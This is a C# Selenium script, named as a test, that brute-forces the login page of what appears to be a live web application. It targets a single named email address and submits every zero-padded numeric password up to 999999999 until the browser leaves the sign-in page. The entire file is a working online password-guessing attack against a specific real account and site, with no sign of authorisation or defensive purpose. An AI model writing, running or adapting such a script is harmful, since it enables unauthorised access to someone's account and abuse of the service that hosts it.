using System;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System.Threading;

class SeleniumTest
{
    static void Main(string[] args)
    {
        // Set up Chrome options
        var options = new ChromeOptions();
        options.AddArgument("--start-maximized");

        // Initialize ChromeDriver
        using (IWebDriver driver = new ChromeDriver(options))
        {
            string username = "adnan@gmail.com"; // Single email
            int maxPassword = 999999999;  // Max limit (for example, 10^9)
            int passwordLength = maxPassword.ToString().Length;

            for (int i = 1; i <= maxPassword; i++)
            {
                string password = i.ToString().PadLeft(passwordLength, '0'); // Pad with leading zeros (if necessary)
                Console.WriteLine($"Testing password: {password}");

                // Navigate to the login page
                driver.Navigate().GoToUrl("https://app.hrbee.xyz/auth/signin");
                Thread.Sleep(3000); // Wait for the page to load

                // Enter username and password
                driver.FindElement(By.CssSelector("input[type='email'][placeholder='Enter your email']")).SendKeys(username);
                driver.FindElement(By.CssSelector("input[type='password'][placeholder='Enter your password']")).SendKeys(password);

                // Click Sign In
                driver.FindElement(By.CssSelector("input[type='submit'][value='Sign In']")).Click();
                Thread.Sleep(5000); // Wait for login attempt to process

                // Check if login was successful
                if (driver.Url.Contains("dashboard") || !driver.Url.Contains("signin"))
                {
                    Console.WriteLine($"Login successful with password: {password}");
                    break; // Exit the loop if successful
                }

                // Optionally, add more checks for error message or failed login
            }
        }
    }
}
